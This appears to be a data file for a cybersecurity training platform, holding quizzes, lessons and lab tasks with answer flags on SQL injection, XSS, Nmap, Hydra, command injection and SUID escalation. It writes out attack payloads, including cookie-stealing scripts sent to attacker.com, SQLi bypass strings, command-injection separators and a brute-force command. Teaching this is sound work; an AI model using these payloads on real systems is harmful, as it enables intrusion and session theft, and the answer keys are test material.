export const INITIAL_QUIZZES = [
  {
    id: "web-sec-les-1-q1",
    lessonId: "web-sec-les-1",
    type: "mcq",
    text: "What is the root cause of SQL Injection vulnerabilities?",
    options: [
      "Overly permissive firewalls",
      "Concatenating untrusted user input directly into SQL commands",
      "Using PostgreSQL instead of MySQL",
      "Enabling Javascript in the browser"
    ],
    correctAnswer: "Concatenating untrusted user input directly into SQL commands",
    explanation: "SQL Injection occurs because the web application fails to separate code commands from user-supplied data, resulting in the database executing the input as executable queries."
  },
  {
    id: "web-sec-les-1-q2",
    lessonId: "web-sec-les-1",
    type: "fill-blank",
    text: "The SQL injection payload syntax characters -- (or #) represent a database __________, which is used to ignore the rest of the original query.",
    correctAnswer: "comment",
    explanation: "A comment indicator (-- or # or /*) tells the database to treat the remaining part of the pre-written SQL query as a comment, effectively stripping away password checks or extra conditions."
  },
  {
    id: "web-sec-les-2-q1",
    lessonId: "web-sec-les-2",
    type: "mcq",
    text: "Which type of XSS stores the malicious payload permanently in a database?",
    options: [
      "Reflected XSS",
      "DOM-based XSS",
      "Stored XSS",
      "Blind Command XSS"
    ],
    correctAnswer: "Stored XSS",
    explanation: "Stored XSS involves saving the payload on the database or server filesystem, meaning anyone who visits that page later will execute the script automatically."
  },
  {
    id: "linux-les-1-q1",
    lessonId: "linux-les-1",
    type: "mcq",
    text: "Which chmod permission value gives owner Read, Write, Execute, and others Read-only?",
    options: [
      "chmod 777",
      "chmod 744",
      "chmod 644",
      "chmod 755"
    ],
    correctAnswer: "chmod 744",
    explanation: "7 (User = 4+2+1) grants full access, 4 (Group = Read only) and 4 (Others = Read only) results in 744."
  },
  {
    id: "eth-hack-les-1-q1",
    lessonId: "eth-hack-les-1",
    type: "mcq",
    text: "Which scan flag is used in Nmap to conduct a stealthy TCP SYN scan?",
    options: [
      "-sT",
      "-sS",
      "-sV",
      "-sA"
    ],
    correctAnswer: "-sS",
    explanation: "The -sS flag stands for SYN Scan, which is also referred to as a half-open or stealth scan because it doesn't open a full TCP connection."
  },
  {
    id: "soc-les-1-q1",
    lessonId: "soc-les-1",
    type: "log-analysis",
    text: "Inspect the log segment below. Identify the malicious IP attempting a brute-force attack and input it:",
    logContent: `Jun 25 02:00:10 mail sshd[1022]: Failed password for root from 185.220.101.44 port 55102 ssh2
Jun 25 02:00:11 mail sshd[1022]: Failed password for root from 185.220.101.44 port 55104 ssh2
Jun 25 02:00:12 mail sshd[1022]: Failed password for root from 185.220.101.44 port 55108 ssh2
Jun 25 02:00:15 mail sshd[1024]: Accepted password for root from 185.220.101.44 port 55112 ssh2
Jun 25 02:00:16 mail sshd[1024]: pam_unix(sshd:session): session opened for user root by (uid=0)`,
    correctAnswer: "185.220.101.44",
    explanation: "The IP 185.220.101.44 is the source of multiple failed root authentication attempts, followed by a successful login, representing a successful SSH brute-force attack."
  }
];

export const INITIAL_LESSONS = [
  {
    id: "web-sec-les-1",
    title: "SQL Injection Fundamentals",
    duration: "20 mins",
    difficulty: "Beginner",
    xpReward: 150,
    learningObjectives: [
      "Understand how SQL databases handle user input",
      "Identify vulnerable entry points in dynamic web applications",
      "Understand union-based SQL injection payloads"
    ],
    interactiveDiagramType: "sql-inject",
    readingMaterial: `### What is SQL Injection (SQLi)?
SQL Injection (SQLi) is a critical web security vulnerability that allows an attacker to interfere with the queries an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve.

#### How SQLi Works
When an application takes user input and concatenates it directly into a database query string without prior sanitization or parameterized inputs:

\`\`\`sql
-- Vulnerable query construction
SELECT * FROM users WHERE username = ' + userInput + ' AND password = ' + userPass + '
\`\`\`

If a user enters \`admin' OR '1'='1\` for the username and anything for the password, the query becomes:
\`\`\`sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '...'
\`\`\`
Since \`'1'='1'\` is always true, the database returns the admin user record, effectively bypassing login authentication!

#### Union-Based SQLi
The \`UNION\` operator allows you to execute one or more additional SELECT queries and append the results to the original query.
\`\`\`sql
' UNION SELECT null, username, password FROM users-- -
\`\`\`
To perform a union-based attack, you must satisfy two requirements:
1. The injected query must return the exact same number of columns as the original query.
2. The data types of the columns in each query must be compatible.`,
    practicalTask: {
      instruction: "Deploy Lab 'SQL Injection Basics' and query the database version. Find the version of SQL and input the flag found in the admin table.",
      targetIp: "10.10.10.45",
      hint: "Try injecting: ' UNION SELECT 'flag', flag_val FROM flags-- -",
      flagRequired: true,
      flag: "THM{sql_inject_master_783}"
    }
  },
  {
    id: "web-sec-les-2",
    title: "Cross-Site Scripting (XSS)",
    duration: "25 mins",
    difficulty: "Intermediate",
    xpReward: 200,
    learningObjectives: [
      "Distinguish between Stored, Reflected, and DOM-based XSS",
      "Execute basic payload scripts to steal session tokens",
      "Implement proper context-aware output encoding"
    ],
    interactiveDiagramType: "xss-flow",
    readingMaterial: `### Cross-Site Scripting (XSS)
Cross-Site Scripting (XSS) is a vulnerability where an attacker injects malicious scripts (usually JavaScript) into otherwise trusted websites. XSS attacks occur when an application includes untrusted data in a web page without proper validation or escaping.

#### Types of XSS
1. **Stored XSS (Persistent)**: The malicious script is permanently stored on the target server (e.g., in a database, comment section). When a victim requests the stored resource, the script executes in their browser.
2. **Reflected XSS (Non-Persistent)**: The script is part of the request sent to the server (e.g., in query parameters) and is "reflected" back immediately in the response. The victim must click a crafted malicious link.
3. **DOM-based XSS**: The vulnerability exists entirely in client-side code. The client-side JavaScript handles input from a source (like \`location.search\`) unsafely and writes it to the DOM.

#### Example XSS Payloads
- Simple popup verification:
  \`\`\`html
  <script>alert(document.domain)</script>
  \`\`\`
- Cookie theft (Session Hijacking):
  \`\`\`html
  <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
  \`\`\`

#### Mitigation
- **Output Encoding**: Convert characters to safe formats before printing them to the screen (e.g., \`<\` becomes \`&lt;\`).
- **Content Security Policy (CSP)**: Deploy strong HTTP headers that restrict the sources of executable scripts.`,
    practicalTask: {
      instruction: "Test input fields for dynamic script rendering. Inject a script that executes cookies output. Retrieve the flag generated in the alert dashboard.",
      targetIp: "10.10.10.45",
      hint: "Try placing a payload like <script>alert('flag')</script> in the vulnerability comment form.",
      flagRequired: true,
      flag: "THM{reflected_xss_cookies_99}"
    }
  },
  {
    id: "linux-les-1",
    title: "Essential Commands & Directory Navigation",
    duration: "15 mins",
    difficulty: "Beginner",
    xpReward: 100,
    learningObjectives: [
      "Understand absolute vs relative directories",
      "Manipulate files (mv, cp, rm, mkdir)",
      "Examine system parameters (whoami, hostname, cat, grep)"
    ],
    readingMaterial: `### Navigating the Linux File System
Linux stores files in a single unified hierarchical tree, starting at the root directory \`/\`. 

#### Primary Commands
- \`pwd\` - Print Working Directory: Tells you where you currently are.
- \`ls\` - List: Lists files and subdirectories. Use \`ls -la\` to view hidden files and full privileges.
- \`cd\` - Change Directory: Navigate between folders.
  - \`cd ..\` moves up one level.
  - \`cd ~\` moves to your home directory.
- \`cat\` - Concatenate: Displays the text inside a file to the screen.
- \`grep\` - Global Regular Expression Print: Searches text files for patterns.
  - \`cat access.log | grep \"404\"\` lists all lines containing HTTP status code 404.

#### Permissions System
Every file and folder has ownership divided into three scopes:
- **User (Owner)**
- **Group**
- **Others (Anyone else)**

Privileges are specified as Read (\`r\` / 4), Write (\`w\` / 2), and Execute (\`x\` / 1). 
\`chmod 755 file.sh\` gives full privileges to User, and read/execute privileges to Group and Others.`,
    practicalTask: {
      instruction: "Launch your Kali Terminal, navigate to the \`/home/student/challenges\` directory, and read the flag file.",
      hint: "Run: 'cd /home/student/challenges && cat flag.txt'",
      flagRequired: true,
      flag: "THM{linux_terminal_pioneer_419}"
    }
  },
  {
    id: "eth-hack-les-1",
    title: "Nmap Port Scanning Basics",
    duration: "25 mins",
    difficulty: "Intermediate",
    xpReward: 200,
    learningObjectives: [
      "Understand active scanning mechanics",
      "Identify the difference between SYN scan (-sS) and TCP scan (-sT)",
      "Run service version detection scans (-sV)"
    ],
    interactiveDiagramType: "tcp",
    readingMaterial: `### Network Reconnaissance with Nmap
Network Mapper (Nmap) is an open-source tool for network exploration and security auditing. It is a standard tool used by penetration testers to map networks and identify live services.

#### How Port Scanning Works
Nmap sends custom packets to target IP addresses and analyzes responses to determine if ports are **open**, **closed**, or **filtered** by a firewall.

#### Essential Nmap Scan Types
1. **TCP Connect Scan (\`-sT\`):** Performs a full 3-way TCP handshake (SYN, SYN-ACK, ACK). It is very accurate but easily logged by firewalls.
2. **SYN Stealth Scan (\`-sS\`):** The default scan type. It sends a SYN packet and waits for SYN-ACK. If received, it immediately sends a RST (Reset) packet to tear down the connection. The handshake is never fully completed, making it stealthy.
3. **Service Detection (\`-sV\`):** Probes open ports to identify the exact service name, application product, and software version running.
4. **OS Detection (\`-O\`):** Probes TCP/IP stack implementation variations to estimate the host operating system.

#### Example Command
\`\`\`bash
nmap -sS -sV -p 21,22,80 10.10.12.8
\`\`\`
This scans target \`10.10.12.8\` on ports 21 (FTP), 22 (SSH), and 80 (HTTP) using a stealthy SYN scan and version detection.`,
    practicalTask: {
      instruction: "Execute Nmap in the embedded Kali terminal on target 10.10.12.8. Find which port hosts a hidden service, log in, and find the flag.",
      hint: "Type: 'nmap -sV 10.10.12.8' inside the terminal window.",
      flagRequired: true,
      flag: "THM{nmap_recon_specialist_2026}"
    }
  },
  {
    id: "soc-les-1",
    title: "Authentication Log Auditing",
    duration: "20 mins",
    difficulty: "Intermediate",
    xpReward: 150,
    learningObjectives: [
      "Understand Linux /var/log/auth.log contents",
      "Trace brute force SSH attacks",
      "Isolate compromise credentials logs"
    ],
    readingMaterial: `### Security Auditing & Logs Analysis
To successfully defend networks, defensive security analysts (Blue Teamers) in a Security Operations Center (SOC) inspect event logs to locate evidence of hacker reconnaissance or intrusion.

#### Investigating Auth Logs (/var/log/auth.log)
In Unix systems, authorization log messages are written to \`/var/log/auth.log\`. Every login attempt (successful or failed), sudo escalation, and ssh session is logged here.

#### Tracing a Brute Force SSH Attack
A typical SSH brute force script will try thousands of password combinations within seconds. In the logs, this exhibits a rapid burst of:
\`\`\`
Jun 25 02:11:05 server sshd[4012]: Failed password for invalid user admin from 192.168.1.102 port 43220 ssh2
Jun 25 02:11:06 server sshd[4015]: Failed password for invalid user admin from 192.168.1.102 port 43222 ssh2
\`\`\`
Look for:
- High frequency of failures from the same IP address
- Multiples login names tried
- A final \`Accepted password\` line which indicates a successful compromise.`,
    practicalTask: {
      instruction: "Examine the log provided in the packet/log analysis quiz below. Find the IP of the attacker and submit it as the flag.",
      hint: "Look at the log lines. Which IP is spamming 'Failed password'?",
      flagRequired: true,
      flag: "185.220.101.44"
    }
  }
];

export const INITIAL_LABS = [
  {
    id: "lab-sql-basics",
    title: "SQL Injection Basics",
    description: "Learn basic authentication bypass and UNION-based data extraction attacks.",
    difficulty: "Beginner",
    duration: "25 mins",
    xpReward: 250,
    category: "Web Security",
    targetIp: "10.10.10.45",
    vulnerableServices: ["HTTP (Apache/2.4.41)", "MySQL (v8.0.22)"],
    instructions: `### Lab Objective
In this lab, you are targeting a vulnerable web administration panel running on \`10.10.10.45\`. Your goal is to bypass the login portal and extract secret database flags.

#### Tasks:
1. Probe the login fields using traditional SQL syntax.
2. Find the version of SQL running on the database.
3. Access the \`flags\` table and locate the hidden flag.

#### Reference Payloads:
- Login Bypass: \`admin' OR '1'='1-- -\`
- Column Discovery: \`' UNION SELECT null, null, null-- -\`
- Data Extraction: \`' UNION SELECT 'flag', flag_val FROM flags-- -\``,
    tasks: [
      {
        id: "lab-sql-basics-t1",
        title: "Bypass Admin Login",
        question: "Enter the SQL injection payload used to bypass password verification and log in as \"admin\":",
        hint: "Place a payload in the username that completes the string query and adds OR '1'='1'",
        flag: "admin' OR '1'='1-- -",
        xp: 100
      },
      {
        id: "lab-sql-basics-t2",
        title: "Retrieve Flag",
        question: "Extract the flag stored inside the secure database flags table:",
        hint: "Run nmap / sql commands in the Kali Terminal or inject dynamic parameters.",
        flag: "THM{sql_inject_master_783}",
        xp: 150
      }
    ]
  },
  {
    id: "lab-nmap-basics",
    title: "Nmap Scanning & Host Enumeration",
    description: "Practice discovering open ports, service versions, and OS operating details using Nmap.",
    difficulty: "Beginner",
    duration: "20 mins",
    xpReward: 200,
    category: "Network Recon",
    targetIp: "10.10.12.8",
    vulnerableServices: ["FTP (vsftpd 3.0.3)", "SSH (OpenSSH 8.2)", "HTTP (Nginx 1.18)"],
    instructions: `### Lab Objective
Target \`10.10.12.8\` is a network machine that holds a secret flag inside its ftp repository.

#### Tasks:
1. Scan the target utilizing Nmap to find which ports are active.
2. Retrieve version details for the open ports.
3. Find which port hosts the hidden service and retrieve the flag.`,
    tasks: [
      {
        id: "lab-nmap-basics-t1",
        title: "Identify Hidden Service Port",
        question: "What port hosts the FTP service on target 10.10.12.8?",
        hint: "Execute 'nmap -sV 10.10.12.8' inside the Kali Terminal.",
        flag: "21",
        xp: 80
      },
      {
        id: "lab-nmap-basics-t2",
        title: "Retrieve Anonymous Flag",
        question: "Retrieve the flag hidden inside the FTP server (Log in using user \"anonymous\" and empty password):",
        hint: "Connect via: ftp 10.10.12.8, use 'anonymous' login, find flag.txt.",
        flag: "THM{nmap_recon_specialist_2026}",
        xp: 120
      }
    ]
  },
  {
    id: "lab-hydra-brute",
    title: "SSH Password Cracking with Hydra",
    description: "Use THC-Hydra to execute online dictionary attacks against SSH login points.",
    difficulty: "Intermediate",
    duration: "35 mins",
    xpReward: 300,
    category: "Active Exploitation",
    targetIp: "10.10.15.110",
    vulnerableServices: ["SSH (OpenSSH 7.9)"],
    instructions: `### Lab Objective
In this lab, you are tasked with cracking an SSH account on \`10.10.15.110\`. You have acquired a username \`security_officer\` and a small wordlist \`wordlist.txt\`.

#### Wordlist Content (/usr/share/wordlists/passwords.txt):
- password123
- sunshine
- shadow1
- cybersecurity
- cybernexus_elite

#### Steps:
1. Run hydra tool referencing the target, user, and wordlist.
2. Crack SSH credentials and log in to grab the root flag.

#### Commands syntax:
\`\`\`bash
hydra -l security_officer -P /usr/share/wordlists/passwords.txt ssh://10.10.15.110
\`\`\``,
    tasks: [
      {
        id: "lab-hydra-basics-t1",
        title: "Discover SSH Password",
        question: "What is the cracked SSH password for user security_officer?",
        hint: "Execute the hydra command inside your terminal.",
        flag: "cybernexus_elite",
        xp: 100
      },
      {
        id: "lab-hydra-basics-t2",
        title: "Acquire SSH Flag",
        question: "Connect using SSH and submit the flag found in the home directory:",
        hint: "Run 'ssh security_officer@10.10.15.110' with password 'cybernexus_elite'.",
        flag: "THM{hydra_brute_ssh_cracked_812}",
        xp: 200
      }
    ]
  },
  {
    id: "lab-stored-xss",
    title: "Stored XSS & Session Hijacking",
    description: "Exploit a stored comment section to execute malicious JavaScript and hijack administrative sessions.",
    difficulty: "Intermediate",
    duration: "30 mins",
    xpReward: 250,
    category: "Web Security",
    targetIp: "10.10.10.88",
    vulnerableServices: ["HTTP (Apache/2.4.49 with PHP)", "SQLite (v3.35.5)"],
    instructions: `### Lab Objective
In this lab, your target is a support ticketing forum at \`10.10.10.88\`. Administrators regularly check this forum. Your goal is to insert a stored script that intercepts administrative cookies.

#### Tasks:
1. Inject a stored XSS script into the support ticket description field.
2. Intercept the victim administrator's HTTP session cookie.
3. Decrypt the Base64 session string or use it to acquire the secret admin flag.

#### Reference Payloads:
- Simple cookie log: \`<script>fetch('http://attacker.com/log?c=' + document.cookie)</script>\`
- Safe image trigger: \`<img src=x onerror=\"fetch('http://attacker.com/log?c=' + document.cookie)\">\``,
    tasks: [
      {
        id: "lab-stored-xss-t1",
        title: "Stored XSS Injection",
        question: "Submit the standard HTML script payload used to output document.cookie via fetch or alert:",
        hint: "Use script tags enclosing fetch to transmit the document.cookie variable.",
        flag: "<script>fetch('http://attacker.com/log?c=' + document.cookie)</script>",
        xp: 100
      },
      {
        id: "lab-stored-xss-t2",
        title: "Extract Administrative Session Flag",
        question: "Enter the administrative session flag recovered from the cookie payload:",
        hint: "The cookie session parameter contains a value starting with 'THM{xss_session_hijack_...}'.",
        flag: "THM{xss_session_hijack_8471}",
        xp: 150
      }
    ]
  },
  {
    id: "lab-command-injection",
    title: "OS Command Injection",
    description: "Exploit a misconfigured network diagnostics web utility to execute arbitrary OS shell commands.",
    difficulty: "Intermediate",
    duration: "25 mins",
    xpReward: 250,
    category: "Active Exploitation",
    targetIp: "10.10.20.15",
    vulnerableServices: ["HTTP (Node.js/Express router)", "Ping Utility (v1.3.0)"],
    instructions: `### Lab Objective
Target \`10.10.20.15\` hosts a web utility designed to allow users to ping external IP addresses to verify network health. However, input parsing is missing, letting you concatenate operating system shell commands.

#### Tasks:
1. Bypass the expected input box format and execute the \`whoami\` command.
2. Traverse the directory structure, find where the flag file is hosted, and display it.

#### Command Concatenations:
- Semicolon separator: \`127.0.0.1; whoami\`
- Logical OR: \`127.0.0.1 || whoami\`
- Pipe separator: \`127.0.0.1 | whoami\``,
    tasks: [
      {
        id: "lab-command-inj-t1",
        title: "Bypass Command Execution",
        question: "What user is the ping web service executing commands as?",
        hint: "Concatenate your ping IP with the command 'whoami'.",
        flag: "www-data",
        xp: 100
      },
      {
        id: "lab-command-inj-t2",
        title: "Display Root Flag",
        question: "Submit the flag stored inside the server file system at /var/www/flag.txt:",
        hint: "Use 'cat /var/www/flag.txt' concatenated to your ping query.",
        flag: "THM{command_injection_rce_902}",
        xp: 150
      }
    ]
  },
  {
    id: "lab-linux-suid",
    title: "Linux Privilege Escalation via SUID Binaries",
    description: "Enumerate local system binaries to locate and abuse misconfigured SUID bits for root escalation.",
    difficulty: "Advanced",
    duration: "40 mins",
    xpReward: 350,
    category: "Linux Security",
    targetIp: "10.10.30.55",
    vulnerableServices: ["SSH (OpenSSH 8.4p1)", "Ubuntu Linux (v20.04 LTS)"],
    instructions: `### Lab Objective
You have successfully gained an unprivileged SSH session on \`10.10.30.55\`. Your goal is to analyze the filesystem, identify misconfigured binaries with SUID (Set Owner User ID) permissions, and escalate your privileges to root.

#### Tasks:
1. Enumerate all executable binaries on the system having the SUID bit set.
2. Leverage the identified binary to read system files or execute root-level shells.

#### Enumeration Command:
\`\`\`bash
find / -perm -4000 -type f 2>/dev/null
\`\`\`
Look for atypical binaries (like \`find\`, \`base64\`, or \`python\`) compiled or configured with the SUID attribute.`,
    tasks: [
      {
        id: "lab-suid-t1",
        title: "Identify SUID Vulnerability",
        question: "Which binary has an atypical SUID bit set that can be abused?",
        hint: "Look closely at the output of your find search for common tools in /usr/bin or /bin.",
        flag: "/usr/bin/find",
        xp: 150
      },
      {
        id: "lab-suid-t2",
        title: "Capture Root Flag",
        question: "Leverage find's exec parameter to read the root flag at /root/flag.txt:",
        hint: "Run '/usr/bin/find . -exec cat /root/flag.txt \\; -quit' or escape via find shell exec.",
        flag: "THM{suid_priv_esc_conquered_448}",
        xp: 200
      }
    ]
  },
  {
    id: "lab-wireshark-pcap",
    title: "Wireshark Packet Analysis",
    description: "Analyze packet capture streams to reconstruct plaintext TCP sessions and harvest login credentials.",
    difficulty: "Beginner",
    duration: "20 mins",
    xpReward: 200,
    category: "Network Defense",
    targetIp: "Local capture.pcap",
    vulnerableServices: ["PCAP Analysis", "Unencrypted FTP Transmission"],
    instructions: `### Lab Objective
In this lab, you are a network security analyst. You have been provided a packet capture \`capture.pcap\` recorded from a core gateway switch. An administrator used unencrypted FTP to transfer sensitive configurations.

#### Tasks:
1. Inspect TCP flow packets inside Wireshark.
2. Extract plaintext username and password structures transmitted in FTP commands.
3. Locate the flag hidden inside the file transfer data packets.

#### Wireshark Filter Guidelines:
- Filter FTP packets: \`ftp\`
- Filter FTP file transfers: \`ftp-data\`
- Follow TCP Stream: Right-click any packet and select **Follow -> TCP Stream** to reconstruct conversations in plaintext.`,
    tasks: [
      {
        id: "lab-wireshark-t1",
        title: "Recover Plaintext FTP Credentials",
        question: "What was the administrator's password transmitted in the unencrypted FTP flow?",
        hint: "Filter packets by 'ftp' and search for 'PASS' parameter values or follow the TCP stream.",
        flag: "nexus_ftp_fallback_901",
        xp: 100
      },
      {
        id: "lab-wireshark-t2",
        title: "Recover Secret Configuration Flag",
        question: "What is the flag found inside the transferred backup file?",
        hint: "Filter by 'ftp-data' or look for the file transfer bytes containing the flag format.",
        flag: "THM{wireshark_cleartext_cred_harvest_21}",
        xp: 100
      }
    ]
  }
];
